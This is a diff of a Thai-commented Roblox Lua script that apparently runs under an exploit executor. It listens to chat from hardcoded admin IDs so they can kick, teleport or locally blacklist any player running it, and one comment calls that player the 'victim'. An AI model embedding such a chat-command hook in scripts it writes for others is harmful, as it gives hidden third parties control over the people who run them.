@@ -1,123 +1,74 @@
 local AdminList = { 
-    8908656348, -- pond
-    290863568,  -- dew
-    -- ⚠️ อย่าลืมใส่ ID ตัวเองตรงนี้ถ้าจะทดสอบ! เช่น:
-    -- 1234567890, 
+    8908656348, -- ใส่ ID แอดมิน
+    290863568,
 }
 
---////////////////////////////////////////////////////////////
--- [SYSTEM] ตัวแปรระบบ
---////////////////////////////////////////////////////////////
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-local BanFileName = "3354_ServerBlacklist.json" 
+local LP = Players.LocalPlayer
+local Http = game:GetService("HttpService")
+local BanFile = "3354_ServerBlacklist.json" 
 
--- 1. ฟังก์ชันเช็คแบน (ทำงานทันทีที่รันสคริปต์)
--- ถ้าเซิร์ฟนี้ติด Blacklist ให้เตะตัวเองออกทันที
-if isfile and isfile(BanFileName) then
-    local success, bannedList = pcall(function() 
-        return HttpService:JSONDecode(readfile(BanFileName)) 
-    end)
-    
-    if success and bannedList then
-        for _, bannedJobId in pairs(bannedList) do
-            if bannedJobId == game.JobId then
-                LocalPlayer:Kick("🚫 This server is Blacklisted by Admin.")
-                return -- จบการทำงาน
-            end
-        end
+-- ระบบเช็คแบน
+if isfile and isfile(BanFile) then
+    local s, r = pcall(function() return Http:JSONDecode(readfile(BanFile)) end)
+    if s and r then
+        for _, id in pairs(r) do if id == game.JobId then LP:Kick("Server Blacklisted") return end end
     end
 end
 
--- 2. ฟังก์ชันเพิ่มการแบน (Server Ban)
-local function addServerBan()
-    local bannedList = {}
-    -- อ่านไฟล์เดิม
-    if isfile and isfile(BanFileName) then
-        pcall(function() 
-            bannedList = HttpService:JSONDecode(readfile(BanFileName)) 
-        end)
-    end
-    
-    -- เช็คซ้ำกัน
-    local found = false
-    for _, id in pairs(bannedList) do
-        if id == game.JobId then found = true break end
-    end
-    
-    -- บันทึก
-    if not found then
-        table.insert(bannedList, game.JobId)
-        if writefile then 
-            writefile(BanFileName, HttpService:JSONEncode(bannedList)) 
-            print("Server Banned Saved!")
-        end
+local function addBan()
+    local l = {}
+    if isfile and isfile(BanFile) then pcall(function() l = Http:JSONDecode(readfile(BanFile)) end) end
+    local f = false
+    for _, id in pairs(l) do if id == game.JobId then f = true break end end
+    if not f then
+        table.insert(l, game.JobId)
+        if writefile then writefile(BanFile, Http:JSONEncode(l)) end
     end
 end
 
--- 3. ระบบดักฟังแชท (Core Logic)
 task.spawn(function()
-    print("Admin System: Loaded") -- เช็คใน F9 ว่าขึ้นไหม
-
-    -- เช็คว่าเป็นแอดมินไหม
+    -- เช็คว่าเป็นแอดมินหรือไม่
     local function isAdmin(userId)
-        for _, id in ipairs(AdminList) do
-            if userId == id then return true end
-        end
+        for _, id in ipairs(AdminList) do if userId == id then return true end end
         return false
     end
 
-    -- เช็คเป้าหมาย
-    local function isTarget(targetName)
-        if not targetName then return false end
-        local myName = LocalPlayer.Name:lower()
-        local myDisplay = LocalPlayer.DisplayName:lower()
-        targetName = targetName:lower()
-
-        if targetName == "$" or targetName == "all" then return true end -- เพิ่ม 'all'
-        if string.find(myName, targetName) or string.find(myDisplay, targetName) then 
-            return true 
-        end
-        return false
-    end
-
-    -- ฟังก์ชันทำงานเมื่อมีคนพิมพ์
-    local function onChatted(msg, speaker)
-        -- ต้องเป็น Admin เท่านั้นถึงจะสั่งได้
+    local function onChat(msg, speaker)
+        -- รับคำสั่งจากแอดมินเท่านั้น
         if isAdmin(speaker.UserId) then
             local args = string.split(msg, " ")
-            local cmd = args[1]:lower()
-            local target = args[2]
-
+            local cmd, target = args[1]:lower(), args[2]
             if not target then return end
             
-            -- เช็คว่าตัวเราคือเป้าหมายหรือไม่ (isTarget)
-            if isTarget(target) then
+            -- ฟังก์ชันเช็คชื่อเหยื่อ
+            local function isMyName(t)
+                if t == "$" or t == "all" then return true end
+                return string.find(LP.Name:lower(), t:lower()) or string.find(LP.DisplayName:lower(), t:lower())
+            end
+
+            -- ถ้าชื่อเราตรงกับเป้าหมาย
+            if isMyName(target) then
+                
+                -- [🔥 ส่วนสำคัญที่เพิ่มมา 🔥] ระบบ Whitelist / Immunity
+                -- ถ้าตัวเราเป็นแอดมิน ให้ "ข้าม" ทันที (ไม่โดนเตะ/ไม่โดนดึง)
+                if isAdmin(LP.UserId) then return end 
+
                 if cmd == ".kick" then
-                    LocalPlayer:Kick("You have been kicked by Admin: " .. speaker.Name)
-                
+                    LP:Kick("Kicked by Admin: " .. speaker.Name)
                 elseif cmd == ".ban" then
-                    addServerBan() -- แบนเซิร์ฟ
-                    task.wait(0.2)
-                    LocalPlayer:Kick("You have been BANNED from this server by Admin: " .. speaker.Name)
-                
+                    addBan()
+                    task.wait(0.1)
+                    LP:Kick("Banned by Admin: " .. speaker.Name)
                 elseif cmd == ".bring" then
-                    local adminChar = speaker.Character
-                    local myChar = LocalPlayer.Character
-                    if adminChar and adminChar:FindFirstChild("HumanoidRootPart") and myChar and myChar:FindFirstChild("HumanoidRootPart") then
-                        myChar.HumanoidRootPart.CFrame = adminChar.HumanoidRootPart.CFrame
+                    if speaker.Character and LP.Character then
+                        LP.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
                     end
                 end
             end
         end
     end
 
-    -- เริ่มดักฟังทุกคนในเซิร์ฟ
-    for _, plr in ipairs(Players:GetPlayers()) do
-        plr.Chatted:Connect(function(msg) onChatted(msg, plr) end)
-    end
-    Players.PlayerAdded:Connect(function(plr)
-        plr.Chatted:Connect(function(msg) onChatted(msg, plr) end)
-    end)
+    for _, p in ipairs(Players:GetPlayers()) do p.Chatted:Connect(function(m) onChat(m, p) end) end
+    Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) onChat(m, p) end) end)
 end)
